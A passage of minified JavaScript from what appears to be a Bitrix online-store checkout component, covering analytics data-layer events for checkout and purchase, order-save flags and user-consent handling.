                maxFontSize: 18,
                smallestValue: !1
            })), objList.length && BX.FixFontSize.init({objList: objList, onAdaptiveResize: !0})
        }, setAnalyticsDataLayer: function (action, id) {
            if (this.params.DATA_LAYER_NAME) {
                var info, i, products = [], dataVariant, item;
                for (i in this.result.GRID.ROWS) if (this.result.GRID.ROWS.hasOwnProperty(i)) {
                    for (item = this.result.GRID.ROWS[i], dataVariant = [], i = 0; i < item.data.PROPS.length; i++) dataVariant.push(item.data.PROPS[i].VALUE);
                    products.push({
                        id: item.data.PRODUCT_ID,
                        name: item.data.NAME,
                        price: item.data.PRICE,
                        brand: (item.data[this.params.BRAND_PROPERTY + "_VALUE"] || "").split(", ").join("/"),
                        variant: dataVariant.join("/"),
                        quantity: item.data.QUANTITY
                    })
                }
                switch (action) {
                    case"checkout":
                        info = {event: "checkout", ecommerce: {checkout: {products: products}}};
                        break;
                    case"purchase":
                        info = {
                            event: "purchase",
                            ecommerce: {
                                purchase: {
                                    actionField: {
                                        id: id,
                                        revenue: this.result.TOTAL.ORDER_TOTAL_PRICE,
                                        tax: this.result.TOTAL.TAX_PRICE,
                                        shipping: this.result.TOTAL.DELIVERY_PRICE
                                    }, products: products
                                }
                            }
                        }
                }
                window[this.params.DATA_LAYER_NAME] = window[this.params.DATA_LAYER_NAME] || [], window[this.params.DATA_LAYER_NAME].push(info)
            }
        }, isOrderSaveAllowed: function () {
            return !0 === this.orderSaveAllowed
        }, allowOrderSave: function () {
            this.orderSaveAllowed = !0
        }, disallowOrderSave: function () {
            this.orderSaveAllowed = !1
        }, initUserConsent: function () {
            BX.ready(BX.delegate((function () {
                var control = BX.UserConsent && BX.UserConsent.load(this.orderBlockNode);
                control && (BX.addCustomEvent(control, BX.UserConsent.events.save, BX.proxy(this.doSaveAction, this)), BX.addCustomEvent(control, BX.UserConsent.events.refused, BX.proxy(this.disallowOrderSave, this)))
            }), this))
        }
    }
}();
//# sourceMappingURL=order_ajax.min.js.map
